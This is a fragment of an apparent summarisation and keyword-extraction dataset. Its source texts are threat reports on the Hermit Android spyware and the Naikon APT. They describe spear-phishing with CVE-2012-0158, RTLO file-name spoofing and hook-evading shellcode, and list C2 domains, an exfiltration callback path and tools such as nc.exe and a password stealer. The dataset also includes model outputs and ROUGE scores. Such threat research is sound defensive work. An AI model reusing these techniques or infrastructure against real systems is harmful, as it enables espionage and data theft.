gcmSenderId projectId , storageBucket apiKeyModules downloaded by [ORG] HermitFirebase [ORG] Messaging [ORG] Service setup parametersModule [ORG] ClipboardDevice InfoFunctionNoteTrack foreground app . [ORG] Steal stored account emails . [ORG] Steal browser bookmarks / searches . Steal calendar events , attendees . Take pictures . Steal current and future clipboard content . Exfiltrate device information , including : Applications root / exploitation statusDownload and install APK files on [ORG] the [ORG] File [ORG] Upload [ORG] Upload files from the device . [ORG] LogEnable / disable verbose logging . Exfiltrate notification content . Dismiss / snooze notifications that reference , but do n\u2019t originate from , the [ORG] Hermit app . Take pictures of the screen . [PERSON] Notification [PERSON] Telegram [PERSON] Prompt the user to reinstall [ORG] Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall [PRODUCT] WhatsAppvia [PRODUCT] Play [PRODUCT] Store . Use root to silently install apps . Use root to copy files the app does n\u2019t have access to . Use root to run \u2018 screencap \u2019 Use root to silently uninstall / reinstall [ORG] Telegram . Also copy the old app \u2019s data to the new app \u2019s folder , changing the files \u2019 [ORG] SELinux contexts and owners17/17", "generated_text": "Lookout Threat Lab; Android surveillanceware; Hermit; the government; Kazakhstan; April 2022; the spyware; modules; Android surveillance; mobile malware; use; SMS messages; a legitimate source; devices; call logs; data; photos; location; the malware; The modules; permissions; the core apps; the Android operating system; location; activity; the malware; access; the C2; the C2 server; its C2 address; the attacker; a domain; the malware; the domain; the spyware; tools; this threat; a front company; the Italian government; integration; the Hermit threat; the country; business.", "ref_text": "<START-1>The report analyzes an Android spyware named Hermit that was used to target victims in Kazakhstan and elsewhere. Hermit is developed by Italian surveillance vendor RCS Lab and a front company called Tykelab. Hermit is modular malware that downloads additional capability modules from its command and control server after initial infection. It can record audio, intercept notifications, steal data like contacts and photos, and more. Samples were found impersonating smartphone manufacturers to trick users into installing Hermit. The malware displays legitimate websites as it starts malicious background activities. In April 2022, Hermit was found targeting Kazakhstan in the wake of anti-government protests being suppressed. The command and control IP tied back to an ISP in the capital. Prior infections were seen in Syria and Italy. The report examines RCS Lab's controversial global spyware dealings with authoritarian regimes. Technical analysis reveals Hermit's advanced capabilities like device exploitation, encrypted communications, configurable parameters, and steps to evade detection and analysis. The report concludes that spyware like Hermit poses a powerful threat, but can be defeated through awareness, application vetting, device hygiene, and dedicated mobile security solutions. In summary, the report provides an in-depth profile of the sophisticated Hermit spyware, its developers, infection tactics, and use in targeted surveillance operations globally. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.46224256292906174, "gpt3/lexical/rouge_rouge2": 0.0781609195402299, "gpt3/lexical/rouge_rougeL": 0.2105263157894737, "gpt3/lexical/rouge_rougeLsum": 0.2105263157894737, "gpt3_generated_text": ["Lookout Threat Lab researchers have discovered enterprise-grade Android surveillanceware called \"Hermit\" being used by the government of Kazakhstan. The spyware, likely developed by Italian vendor RCS Lab S.p.A and telecommunications company Tykelab Srl, was detected in April 2022, four months after protests in the country were violently suppressed. Hermit is a modular surveillanceware that exploits rooted devices to record audio, make and redirect phone calls, collect data such as call logs, contacts, photos, device location, and SMS messages. It is distributed via SMS messages pretending to come from legitimate sources and impersonates the applications of telecom companies or smartphone manufacturers. Lookout believes that the spyware is being deployed by an entity of the Kazakh government. Prior to the Kazakhstan deployment, Hermit was also found in northeastern Syria, and the Italian authorities used it in an anti-corruption operation in 2019. The spyware is connected to RCS Lab, which operates in the same market as Pegasus developer NSO Group Technologies and Gamma Group, known for creating FinFisher. These companies claim to only sell to customers with legitimate uses for surveillanceware, but the tools are often abused for spying purposes. The article does not mention the specific integration of Hermit with the Android operating system or the involvement of the Italian government, and it does not provide information on the business implications of this threat."]}, {"split_name": "val", "sample_id": "val_27", "prompt_text": "Extract the keywords: The MsnMM Campaigns The Earliest Naikon APT Campaigns Over time , the Naikon APT appears to have used specific toolsets against organizations within a designated country , as though each campaign was focused on [CARDINAL] one country . There is sometimes crossover between campaigns in several ways : the backdoors they deliver , the infiltration techniques , and the overall infrastructure . Backdoor functionality can also cross campaigns and tools . For example , sometimes we see an \u201c inject \u201d variant dropping a \u201c sys10 \u201d backdoor . Or a naikon backdoor dropping a rarstone backdoor . Again , this particular actor is responsible for the [GPE] MsnMM and [ORG] Naikon campaigns deploying the following backdoors and tools : \u25cf sslMM \u25cf xsControl / naikon and plugins \u25cf \u25cf [ORDINAL] second stage toolsrarstoneThe [ORG] Naikon group also deployed a lesser - known set of [ORDINAL] second stage tools . They mixed together legitimate system administration tools with offensive network reconnaissance tools , including a custom network and service scanner and an attack codeset based on old [ORG] Honker [ORG] Union codebase shared on [LANGUAGE] Chinese - speaking forums . See \u201c [WORK_OF_ART] Second [WORK_OF_ART] Stage [WORK_OF_ART] Tools \u201d . For [DATE] years , [ORG] Naikon downloaders / backdoors were delivered to victim systems with kit - produced CVE-2012 - 0158 spear - phish . This exploit builder kit was shared amongst multiple APTs , because we see the same exploits dropping tools from various groups . Many of these exploit attachments were blocked by our advanced exploit protection ( [ORG] AEP ) on customer systems in [GPE] Vietnam , [GPE] Myanmar , the [GPE] Philippines , and organizations related to the energy sector in these and other [ORG] ASEAN nations . Some of these backdoors and spear - phish activities also showed up in [LAW] the [LAW] Hardore [LAW] Charlie [LAW] CEIEC dump . In [DATE] Jan [DATE] 2014 , we observed in some targets the increase of \u201c right - to - left - override \u201d ( RTLO ) naming schemes for initial payload delivery . In addition to its custom toolset , it appears to test freely - distributed tools - in [DATE] December [DATE] 2013 , it pushed out \u201c Everything32 \u201d to victim systems , and [ORG] TeamViewer was used as well . It is likely that the group faced difficulties when it came up against anti - malware products and tried abusing legitimate tools for anti - malware evasion . Finally , this threat actor deploys a custom pdf binding tool , to add to its effective but low - tech toolset . The [ORG] Naikon attackers can be , and in fact have been precise in social - engineering their targets . Data collection prior to an attack may have included the following data points : full namesinterests in current events \u25cf \u25cf email addresses and status ( active or inactive ) \u25cf date of birth and age \u25cf previous email and social network communications to and from a target \u25cf language spokenVictims of the early campaigns were located mostly throughout [GPE] Myanmar , [GPE] Vietnam , [GPE] Singapore , [GPE] Laos , [GPE] Malaysia , and the [GPE] Philippines . There are other locations where [ORG] Naikon [ORG] \u2019s victims can be found , but these countries stand out . To get in to target networks , the [ORG] Naikon [ORG] APT relied on email as an attack vector . It [ORDINAL] first compromised victim systems using common spear - phishing techniques , Such as cve-2012 - [DATE] 0158 exploit attachments , attachments altered with RTLO techniques , and a combination of icon - spoofing and name padding for executables . The [GPE] MsnMM campaigns featured ripped images and documents re - used for spear - phish decoys , and we see that technique reapplied throughout other [ORG] Naikon [ORG] APT campaigns . The winMM components were also delivered to [GPE] Myanmar victims throughout [DATE] mid-2013 using [FAC] RTLO and icon - spoofing techniques and sometimes even simpler icon spoofing+double extension+extra spacing in attachment filenames . For example , many of the [ORG] Backdoor . [GPE] Win32.MsnMM.i ( winMM ) executable filenames maintained [CARDINAL] almost [CARDINAL] 200 spaces , looking like this : \u201c letter to [GPE] Gov office.doc .exe \u201d The Naikon APT used multiple backdoors presenting a variety of behaviors over time , but clusters of indicators were fairly consistent into [DATE] 2015 . Shared Exploit Generation Kit It \u2019s interesting that what appear to be multiple campaigns and crews all use a kit that generates CVE-2012 - 0158 exploits embedded with arbitrary backdoors for spear - phishing . [CARDINAL] One of the interesting characteristics of [ORG] the [ORG] Naikon [ORG] APT [ORG] \u2019s kit - produced shellcode is its runtime function offset calculations and control flow are built to jump past behavior - based protection and sandbox analysis . Each of the win32 api shellcode calls are carefully executed to land just past function hot patch space and prologues , evading user mode trampolines and hooks . [GPE] MsnMM , [ORG] Naikon [ORG] and [ORG] Rarstone backdoors were generally delivered with stock [CARDINAL] 0158 exploits . Some dropped iph.bat and an \u201c iExplorer.exe \u201d that began with a \u201c WMcal \u201d parameter and profile.dat executable blob loaded into a running IE process . Other APTs use this kit as well . We found Stone Panda Poison Ivy samples delivered with the same CVE-2012 - 0158 exploits , dropping iph.bat and iExplorer.exe , and running the \u201c iExplorer.exe WMcal \u201d executable filename [WORK_OF_ART] Finally , we found another exploit builder \u2019s template used to attack [NORP] Korean - speaking targets . It was used across this group and others for building CVE-2012 - 0158 files , sharing the common author \u201c [PERSON] Tran [PERSON] Duy [PERSON] Linh \u201d . [ORG] Shared [ORG] Strings , [ORG] Functionality , Targets , and Infrastructure across Campaigns [PERSON] Multiple [PERSON] Naikon tools used in multiple campaigns shared strings , functionality , a deployment and content focus on [ORG] ASEAN organizations and other organizations doing business with them , and the infrastructure itself . Let \u2019s examine some of the toolset \u2019s shared strings and functionality , then move on to shared infrastructure . While the [ORG] Naikon backdoor maintained the user - agent string \u201c NOKIAN95 / WEB \u201d , it also maintained a debug path [PERSON] f:\\MyProjects\\xServer\\Release\\xServer.pdb [PERSON] Also , the [PERSON] Naikon backdoor \u2019s matching management software is called \u201c xsControl \u201d . Plugins for the [ORG] Naikon backdoor included a screenshot grabber named [ORG] xsAdv.dll , and a single export This debug path in [ORG] Naikon backdoors is very similar to the debug path maintained in [PERSON] Rarstone backdoors : g:\\MyProjects\\xsFunction\\Release\\DLL.pdb The [GPE] MsnMM campaign backdoors all maintain an \u201c MM \u201d internal name , and the functionality changes when comparing them : A more recent oddity from this group includes a WinMM dropper with the internal name \u201c Zhixin \u201d , creating a recently compiled Sys10 backdoor . Some \u201c MM \u201d executables maintained debug strings across versions and families : J:\\chong\\new\\Release\\SslMM.exe and J:\\chong\\nod\\Release\\SslMM.exe Shared infrastructureNow , let [GPE] \u2019s take a look at some of the shared infrastructure that helps to tie all of these campaigns together . MsnMM backdoors and naikon backdoors share portions of infrastructure across campaigns . For a quick example , early [GPE] msnMM backdoors like sslMM , and [CARDINAL] one of the later tools , exe_exchange , share some domains with the nokian95 ( naikon ) and sys10 backdoors . There is much crossover : Here , you can see a table recording domains that are shared across the backdoors for command and control infrastructure.ahzx.eicp.netmncgn.51vip.bizbkav.imshop.inubaoyouxiang.gicp.netgooglemm.vicp.netmyanmartech.vicp.netexe_exchangeyesyesyessys10winMMsslMMwininetMM / saktoxsPlus / naikonyesyesyesyesyesyesyesyesyesyesyesyesyesyesCorrelating [ORG] Target [ORG] Profiles with [NORP] Spearphish and Decoy Content One of the most striking characteristics of this [ORG] APT is that its targeting interest is revealed by its spear - phish and decoy content . Malicious actors of all stripes , including cybercriminals , have for [DATE] at [DATE] least [DATE] the [DATE] last [DATE] ten [DATE] years abused \u201c hot topics \u201d in their social - engineering content to better attract and mass - exploit victim systems . It \u2019s a pretty worn - out discussion . What is different about [ORG] the [ORG] Naikon [ORG] APT [ORG] \u2019s use of hot topics in spear - phish and decoy content is that reveals its specific victims and how these change over time . Precision social engineering seems to be an elevated skill set for the group . A few of the most interesting examples of such content include : a [ORG] UN discussion and vote on nuclear proliferation and disarmament , the [ORG] MH370 flight , and construction on the [ORG] Raytheon - built [ORG] National [ORG] Coast [ORG] Watch [ORG] Center in [GPE] PH . For example , in [DATE] the [DATE] second [DATE] week [DATE] of [DATE] October [DATE] 2012 , during the gang \u2019s intense ongoing focus on SE [NORP] Asian countries like [GPE] Cambodia and its diplomats , we find a winMM backdoor detected as \" Trojan.Win32.Agent.udtc \" in [GPE] New [GPE] York [GPE] City . This verdictidentified [ORG] the [ORG] Naikon [ORG] APT [ORG] \u2019s backdooron the victim system . The timing is uncanny because , in that same week speeches and views on nuclear disarmament and non - proliferation were presented by SE [NORP] Asian country delegates to [ORG] the [ORG] United [ORG] Nations in [GPE] New [GPE] York [GPE] City . An example of such a talk is here ; a naikon decoy \u2019s content was strikingly similar : MsnMM campaigns most commonly presented spear - phish exploits targeting CVE-2012 - 0158 . A listing of screenshots in [ORG] Appendix [ORG] A reveals the variety of content and themes , all related to events and topics in the [ORG] ASEAN region . Example titles include : Letpadaung copper mine.docMyanmar [GPE] Wanbao to commence construction of [ORG] Letpadaung projectDecember [CARDINAL] 2014nuclear agreement burma.docBurma [PERSON] Signs [PERSON] New [PERSON] Nuclear [PERSON] Deal With IAEASeptember 2013ALP Statement on Present Illegal [ORG] Bangali [ORG] Problem inside Arakan.docALP statement on present illegal [PERSON] Bangali problems inside [ORG] Arakan [ pdf]December [CARDINAL] 2012Calendar Misslao [DATE] 2013 Free.docMiss [PERSON] Lao [PERSON] CalendarsJanuary 2014ASEAN and [ORG] Partners [ORG] Firmly [ORG] Committed to Narrowing the Development Gap.docASEAN and Partners Firmly Committed to Narrowing the Development GapApril 2013refer to the [ORDINAL] 11th ACD Ministerial Meeting.docAsia Co - operation Dialogue eyes peaceDecember 2013Asia \u2019s Military Developments.docAsia \u2019s military developments [DATE] November 2013The following example \u2019s content was crafted to appear like a legitimate international agreement discussion . After the malicious document is opened and successfully exploits CVE-2012 - 0158 on the victim workstation , the exploit code drops and opens this decoy Word document : This next example is written with the [NORP] Laotian Phetsarath OT font , a decoy attempt to be a legitimate Daily News Brief from [ORG] the [ORG] Laotian [ORG] Foreign [ORG] Ministry [ORG] of [ORG] Affairs . It demonstrates the group \u2019s intentions to hit targets in [GPE] Laos : Appendix A contains many more example document titles and screenshots . The themes and content that would appeal to politically - interested individuals in various parts of the world quickly In addition to a high volume of files exploiting CVE-2012 - 0158 , the [GPE] MsnMM attackers for a brief period used [PERSON] RTLO ( right to left override ) techniques , and then attachments exploiting CVE- 2010 - 3333 . An example of RTLO that creates and opens this decoy document to camouflage its malicious background activity , then dropping and executing [GPE] MsnMM backdoors on its victim system : UNFC_Statement_final_rcs.pdfNaikon [ORG] APT [ORG] MsnMM [ORG] Campaign [ORG] Backdoors and Lateral Movement Toolset - % temp%\\conime.exe77,824 bytes2013:01:31 01:25:38 + 00:006.0The MsnMM gang built and released many more variants of their sslMM creation . The code is a full - featured backdoor . Each variant of this tool starts by attempting to create a socket , and then creates a new thread implementing a fairly complicated keylogging facility not often seen , using Windows Keyboard Accelerators . Online code demonstrates the technique here : url The backdoor retrieves a large number of victim system data points , which it then uses to check in to its hardcoded C2 . The backdoor reports system identification information both to present the victim \u2019s identifying information and to fingerprint the system for asset management : \u25cf OS version \u25cf Service pack information \u25cf Logged - on user name \u25cf OS install dateOne of its more interesting features is the ability to fetch and use certificates from the \u201c My \u201d store on Windows systems . The \u201c My \u201d certificate store is created on a per - user basis , and this is where users \u2019 certificates are stored . It is reserved for each user for signing and decrypting data and encrypting network communications . Feature list : \u25cf Victim fingerprinting and performance sensitivity - system configuration collection \u25cf Persistence - immediately identifying [ORG] the [ORG] Start [ORG] Menu [ORG] Startup directory and dropping a [ORG] LNK to its own executable disguised as a \u201c Office Start \u201d , \u201c [WORK_OF_ART] Yahoo [WORK_OF_ART] Talk \u201d , \u201c [WORK_OF_ART] MSN [WORK_OF_ART] Gaming [WORK_OF_ART] Z0ne \u201d , or \u201c [WORK_OF_ART] MSN [WORK_OF_ART] Talk \u201d shortcut \u25cf Configurable network settings - both a primary and backup C2 string is hard - coded ineach backdoor . At this point , we are aware of [CARDINAL] almost [CARDINAL] 50 domains and unique [ORG] IP addresses used to host C2 \u25cf Keylogging facility - Windows Accelerators with hidden window and lengthy Acceleratortable \u25cf Flexible network connectivity - proxy support for use with victim systems situated behindisolated networks \u25cf GET and [ORG] POST network code for exfiltrating system information \u25cf Log file capabilities \u25cf File search and file write primitives - identifying and collecting sensitive ondiskinformation \u25cf Download and execute further arbitrary downloads \u25cf Arbitrary inter - process launch and communication through named pipes \u25cf Process privilege and token adjustments \u25cf Anti - malware kill - process identification and termination \u25cf [ORG] Digital [ORG] Certificate stealing and reuse for stealth SSL communications % temp%\\wuauc1t.exe118,784 bytes2012.11.01 00:53:49version6.0WinMM is a full - featured , simple backdoor . Its [ORDINAL] first actions upon installation are to collect user and system data and report them back to the [CARDINAL] C2 over http . It uses [ORG] NetUserGetInfo to identify that it is running under an \u201c Admin \u201d account on the local system , then retrieves the system name and the version of the operating system that is running , including its service pack , and collects the system install date from the registry : \\\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\InstallDate . These values are built into a single string for reporting . SslMM also maintains this code chunk and functionality but does not immediately invoke it like winMM . Also interesting and different from sslMM , are the decoy Word documents dropped by many of the winMM droppers . Images of these documents are shown in the [LOC] Appendix . The documents are all written and formatted with a specially developed Myanmar2 True Type font , demonstrating the focus on politically - connected , native [GPE] Myanmar speakers as targets . This font is not delivered by default with [ORG] Microsoft [ORG] Office . Instead , it must have been specifically installed by the attackers and then by the victims , otherwise the documents would not have displayed The backdoor maintains multiple primitive functionalities : Setting a WH_CBT [PRODUCT] Windows hook for full activity spying ( sslMM does not maintain this hooking functionality ): \u25cf File search and capture \u25cf Process creation \u25cf Keystroke captureThe backdoor is usually configured with primary and backup domains for [CARDINAL] C2 communications , although there are multiple known samples that maintain an [ORG] IP address or only a single domain for communications with no backup . Communication is built to appear as though a web browser is simply making a request to a remote web server . Some of these backdoors are configured to use an unusual port for encrypted communications . % temp%\\services.exe69,632 bytes2012 - 03 - 13 - wmiprive.exe159,744 bytes2011.12.19 [CARDINAL] 08:06:306.0In [DATE] 2014 the Naikon gang was found to be using another tool that maintains an internal name \u201c xsPlus \u201d and \u201c xsControl \u201d . This builder and its backdoors produce components with the \u201c NOKIAN95 / WEBx \u201d user - agent strings , for which there are multiple versions . Its functionality is covered in our previous [ORG] Naikon [ORG] APT post . [ORG] Naikon and minor links with APT30 Another interesting aspect of the backdoor builder is that it also provides a keylogger plugin that is used on specific victim systems . And here there are minor , but striking , similarities with the [PERSON] Callback sessions for stolen data include these URLs : POST /stonehoof.rar / user = xxx&password = xxx tool upload xml formatted data . Presenting a similarity with the [DATE] APT30 artifacts , their callback domains included stonehoof.com , hosted on several IPs during the naikon campaigns . This name is very unusual , and it is an odd coincidence that it is shared by [CARDINAL] two geopolitically - focused cyber - espionage groups , both targeting the [LOC] South [LOC] China [LOC] Sea region . APT30 - stonehoof.com [DATE] 2012 - 10 - 07 2013 - 04 - 03 2013 - 04 - 14 While the [GPE] MsnMM components include the unusual \u201c MM \u201d in internal names sslMM , winMM , and wininetMM , some of the strings in the APT30 GEMSTONE software include the same \u2013 search and retrieval of the registry key \u201c Software\\Microsoft\\GetMM \u201d , and [CARDINAL] three function names \u201c [PRODUCT] MicrosoftGMMExit , [GPE] MicrosoftGMMHaveExit , [PERSON] MicrosoftGMMZJ \u201d . The APT30 BACKSPACE backdoor also contains a similar potential target reference , as discussed in the [ORG] FireEye paper . \u201c BACKSPACE Variant ZJ Auto ( version [CARDINAL] 1.4 ) So , the \u201c MM \u201d shared by both of these may be a simple reference to [GPE] Myanmar , the starting target for these [ORG] Naikon [ORG] APT attacks . APT30 backdoors also add \u201c MSN.lnk \u201d shortcuts to [ORG] the [ORG] Start [ORG] Menu [ORG] Startup location for persistence , just like the [GPE] MsnMM components spoof \u201c [PERSON] Msn [PERSON] Gaming [PERSON] Zone.lnk \u201d and \u201c [WORK_OF_ART] Msn [WORK_OF_ART] Talk.lnk \u201d update.exe116.5 kb2013.02.01 07:39:129.0Yet another backdoor was used throughout [DATE] 2013 by [ORG] Naikon . Several of the C2 domains are shared with either [PERSON] Naikon or [GPE] MsnMM infrastructure . This backdoor is a very basic initial component . To give an idea of the sophistication of its development , [CARDINAL] one of the decryption schemes it uses is an xor [GPE] 0x1 loop on the very beginning of its .data section to decrypt its C2 domain . In this case , [CARDINAL] 6C [CARDINAL] 6C 6A 62 66 2F 74 68 62 71 2F [DATE] 6F [DATE] 64 [DATE] 75 [DATE] 01 ( lljbf / thbq / odu ) \u2192 mmkcg.uicp.net . This weak level of encryption is odd , because other strings , like the unicode version of the callback url \u201c s.y.s.t.e.n.&.c.p.=.%.s.&.l.o.g.=.%.s.&.i.n.d.e.x.=.%.d . \u201d , are maintained in plaintext in the .rdata section . Perhaps the authors thought xor\u2019ing the domains would hide their infrastructure for as long as needed , or they were working with others who did n\u2019t understand automated sandboxes and tracing but did n\u2019t want the dns strings present in the binary . It does n\u2019t seem to make sense , but it appears to have been effective enough to leave in the executables . For all of the \u201c Sys10 \u201d backdoors , URL parameters were used consistently for the initial C2 callback : systen&cp=&log=&index= where : cp = system computername log = signed decimal integer representation of the OS InstallDate index = simply the return value from a GetTickCount call The backdoor collects several bits of identifying information to send to the C2 : \u25cf computer name \u25cf account name of logged - in user \u25cf group name of logged - in user \u25cf \u25cf OS versioning information \u25cf OS install datelocal IP addressThe backdoor maintains a simple set of primitives : \u25cf http - based communications with hardcoded C2 \u25cf download additional components \u25cf start a new process \u25cf create filesterminate a running process find files and copy themWe detected this backdoor on multiple victim workstations with the following verdicts : [GPE] Trojan . Win32.Agentb.hyb Trojan.Win32.Agentb.iqj [ORG] Backdoor . Win32.MsnMM.p UDS : DangerousObject . Multi . [PERSON] Generic [PERSON] Trojan . Win32.Agentb.jwpAccording to [ORG] KSN ( [ORG] Kaspersky [ORG] Security [ORG] Network ) data , almost all of the victims attacked with this backdoor are based in [GPE] Myanmar , or were [GPE] Myanmar delegates travelling through the other countries like the [GPE] US , for example . Some of the victims were located in [GPE] Vietnam and [GPE] Singapore . Victim profiles range from global political representatives and local IT service companies , togovernment ministries controlling media and news content , university students , and local law [CARDINAL] 07:59:149.0Second stage tools Most of [ORG] the [ORG] Naikon [ORG] APT [ORG] \u2019s [ORDINAL] second stage tools detected on victim networks are publicly - available . Some are very common system administration tools and utilities , and some are less publicly- available custom written scanners and tools available through [NORP] Chinese hacking forums . Their ability to move through networks undisturbed appears to have matured over time , demonstrating that they are a seasoned team : \u25cf Windows system utilities : ftp.exe , systeminfo.exe , ipconfig , net view , ping , netstat -ano , net use , quser , tasklist , netsh interface ip , netsh interface show , netsh advfirewall firewall , reg export , AT \u25cf Sysinternals : procmon.exe , tcpview.exe , procexep.exe , psexec \u25cf Prosolve : winscan.exe \u25cf Rarlabs : rar.exe \u25cf Other : procex.exe , [LANGUAGE] nc.exe , xscan.exe , winscanx.exe , hscan120.rar package ( includes mysql.exe and sqlcmd.exe ) , cutfile.exe , tftp.exe , Win7 elevation of privilege and [ORG] UACbypass , ReadPSW.exe ( password stealer)The Naikon APT frequently used a custom backdoor that appears to be an [ORG] HDoor variant , based on old \u201c [ORG] Honker [ORG] Union \u201d code like \u201c hscan v120 \u201d . For example , once on a victim network , [CARDINAL] one of the [ORDINAL] first steps is to run the hdoor -hbs scan to identify target local network hosts . Alternatively , it may show up on victim networks and be run with a long list of parameters : Custom HDoorMD5 \u2013 FilenameFile [CARDINAL] 8 - lms.dat56 kb2015.05.20HackTool . [PERSON] Win32.Agent.whjThe [PERSON] Naikon [PERSON] APT [PERSON] \u2019s custom - built [ORG] HDoor tool is a robust reconnaissance tool for lateral movement , supporting the identification of , interfacing with and attacking of multiple technologies and resources : \u25cf host , user , group , and related authentication resources and cracking / brute forcingcapabilities \u25cf network asset scanning and identification , including [ORG] SQL database , embedded networkdevices like home or [ORG] SMB routers , and other common network services fake service listener to sniff traffic \u25cf \u25cf disk wiping - safe delete with multiple overwrites local filetime modifier \u25cf [ORG] SQL administration toolset \u25cf [ORG] SOCKS5 proxy service \u25cf banner - based scanner include [CARDINAL] 21,22,80,3389,1433,3306 , and [CARDINAL] 389 . Sometimes , they add [CARDINAL] 139 and [CARDINAL] 445 to the end of Sea : \u25cf Law enforcement \u25cf Government - executive , administrative , regulatory \u25cf Military - operations centers \u25cf Public / Private energyShared [NORP] Victims with [ORG] Cycldek [ORG] and [ORG] Comparing [ORG] Lateral [ORG] Movement with Cycldek The Cycldek APT appeared to follow an operational script across victim systems . It created or used [ORG] c:\\intel on the victim hard disk to unpack tools and compress / archive stolen victim files and data with [ORG] Winrar , like \" c:\\intel\\1.rar \" . Some of these victim systems were occupied by both the [ORG] Cycldec and [PERSON] Naikon attackers . The [ORG] Cycldek attackers maintained this [ORG] c:\\intel directory and its subdirectories as a sort of staging point . This mirrors what we have seen with [ORG] Naikon directory setup on some victims . \u25cf a set of subdirectories \u25cf stolen files for exfiltration \u25cf Cycldek tools and their config filesThe Naikon APT and [PERSON] Cycldek [PERSON] APT also share a common attraction to [ORG] Honker [ORG] Union codebase . Spear - phish , dropped files , web browser injection The common sequence of events on a vulnerable system falling for related spear - phish attacks led to a newly - created Internet Explorer process running with execution transferred to additionally loaded executable code , usually profile.dat , maintaining the connectback [CARDINAL] C2 communication code and data . In this instance , a \u201c naikon backdoor \u201d was delivered initially as a part of a small package of objects . The exploit attachment dropped iph.bat , iExplorer.exe , and a clean decoy document . The exploit executed this batch file , which in turn executed iExplorer.exe and opened a decoy document from % temp% . The iExplorer.exe process wrote out a profile.dat file , launched the legitimate Internet Explorer , and injected the .dat file into this newly created browser process . It transfered control to the injected .dat code and terminated itself . The .dat code then connected with a hardcoded C2 from within Internet Explorer , a common technique for evading anyoutbound traffic firewall issues . The full email spear - phish and other decoy documents \u2019 content presented here display the campaigns \u2019 focus on [ORG] ASEAN targets that line up with the [GPE] MsnMM campaigns : Example spear - phish and dropped sequence for NOKIAN95 / WEB sent to web email service provider users in the [GPE] US and [NORP] Southeastern [NORP] Asian region : Example Word document decoyExample details , exhibiting the \u201c common \u201d sequence of events on systems : Drops \u2192 % temp%\\iph.bat \u2192 % temp%\\iExplorer.exe WMcal C2 : phsenator.vicp.net \u201c [WORK_OF_ART] Australian [WORK_OF_ART] Strategic [WORK_OF_ART] Policy [WORK_OF_ART] Institute \u201d blog post located here - url Settings\\Temp\\mshtml.dat resistance day _ burmese language_?fdp.scr \u201d \u2190 indicates RTLO naming , appeared to the target as pdf \u201c knu president speech on [ORDINAL] 65th anniversary of karen resistance day _ burmese [CARDINAL] C2 : ttteco.vicp.netMany of these backdoors were delivered by simply binding decoy pdfs to a [ORG] Naikon backdoor and sending this bundle to target addresses . Here is a [DATE] March [DATE] 2014 spear - phish email with the and a [ORG] Naikon dropper name \u201c 24march_final_TAPE TRANSC~1 \u201d detected as \u201c Trojan- clean copy of this decoy pdf that opens on execution , [ as well as ? ] the [PERSON] Naikon backdoor ( 03A3251BDE74DF30AB5BF0B730E08C8D ) that communicates with C2 xl.findmy.pw . This dropper is built with the attackers \u2019 \u201c pdfBind [DATE] 2012 \u201d tool . Once extracted to disk , you can see that the icon was replaced for the executable with an [ORG] Adobe pdf icon . Lots of users fall for this sort of trick when file extensions are not visible : Appendix A : MsnMM Spearphish and Decoy Content \u201c [ORG] ICJ \u2019s verdict owed respect [CARDINAL] 17 Apr [CARDINAL] 2013.doc\u201dImage [CARDINAL] 2 . \u201c [WORK_OF_ART] FDI [WORK_OF_ART] Law [WORK_OF_ART] Weeding Menu.doc\u201dImage [CARDINAL] 3 . \u201c Danh sach dai bieu [ORG] HNHTDMNC tai TPHCM.doc\u201dImage 4 . \u201c [PERSON] Thein [PERSON] Sein [ORDINAL] first [NORP] European tour.doc\u201dImage 5 . \u201c [ORG] ASEAN and Partners Firmly Committed To Narrowing Development Gap.doc\u201dImage 6 . \u201c ALP Statement on Present Illegal [ORG] Bangali [ORG] Problem inside Arakan.doc\u201dImage [CARDINAL] 7 . \u201c ISEAS Perspective [DATE] 29nov12.doc\u201dImage [DATE] 8 . \u201c [WORK_OF_ART] Learning [WORK_OF_ART] Journal [WORK_OF_ART] ASC [WORK_OF_ART] 13-1_1.doc \u201d ( related to url content / uploads/2013/01 / finalfinalhandbookJan13.pdf , url [CARDINAL] 9 . gia dinh.doc \u201d , delivered to VN targetswinMM - related [ORG] Dropped [ORG] Decoy [ORG] Documents \u201c book form for naning [CARDINAL] 30-8.doc \u201d Unknown . \u201c fact sheet asean - us ( president office format).doc \u201d Dropped by \u201c fact sheet asean - us ( president office format).doc .exe \u201d Trade and Investment ( english).doc List of Attendance.doc Dropped by [DATE] F14C42765F130EE6DEC3A87DC50A47E1Image [DATE] 6 . \u201c talking point english(english).doc \u201d talking point myanmar ( 21 - [CARDINAL] 3 - 2013).docx Dropped by \u201c talking point myanmar ( 21 - [CARDINAL] 3 - 2013).docx .exe \u201d tp for vp with swiss_myanmar[1].doc Dropped by \u201c tp for vp with swiss_myanmar[1].doc .exe \u201d Dropped by [CARDINAL] 7F422B43EEB93B230FF7553C841C4785Image [CARDINAL] 11 . Unknown . \u201c tp for ec ( myanmar).doc \u201d \u201c trade and investment ( english).doc \u201d \u201c [ORDINAL] 11th bcim fapc memo.doc \u201d \u201c ( r ) final - h.e remarks.doc \u201d lo list(26 - 8 - 2013).docx \u201c sightseeing tour in bagan.doc \u201d [ORG] Ns [ORG] admin.docx [ORG] Components related to [ORG] the [ORG] Naikon [ORG] APT are detected under a range of verdict names . Below is a listing of the most common : [ORG] Backdoor . Win32.MsnMM . * Backdoor . Win32.MsnMM.a - .af Backdoor . Win32.Sakto . * Backdoor . Win32.Sakto.a - .ct [ORG] Trojan - Downloader . Win32.Cordmix . * [ORG] Trojan - Downloader . Win32.Cordmix.b [ORG] Trojan-Downloader.Win32.Cordmix.ch [ORG] Trojan-Downloader.Win32.Cordmix.cs [ORG] Trojan-Downloader.Win32.Cordmix.ds [ORG] HackTool . Win32.Agent . * HackTool . Win32.Agent.whjExploit . [PERSON] MSWord . CVE-2012 - 0158 . * Exploit.MSWord.CVE-2012-0158.cb Exploit.MSWord.CVE-2012-0158.ci Exploit.MSWord.CVE-2012-0158.di Exploit.MSWord.CVE-2012-0158.dj Exploit.MSWord.CVE-2012-0158.du Exploit.MSWord.CVE-2012-0158.eb [ORG] Exploit . Win32.CVE-2012 - 0158 . * [GPE] Exploit . Win32.CVE-2012 - 0158.a Exploit.Win32.CVE-2012-0158.aw [PERSON] Exploit . Win32.CVE-2012 - 0158.j Trojan - Dropper . [PERSON] MSWord . Agent . * Trojan-Dropper.MSWord.Agent.hc [GPE] Exploit . OLE2.CVE-2012 - 1856.a HEUR : Exploit . [PERSON] MSWord . CVE-2012 - 0158.gen [GPE] Exploit . OLE2.Toolbar.a Backdoor . Win32.Agent . * 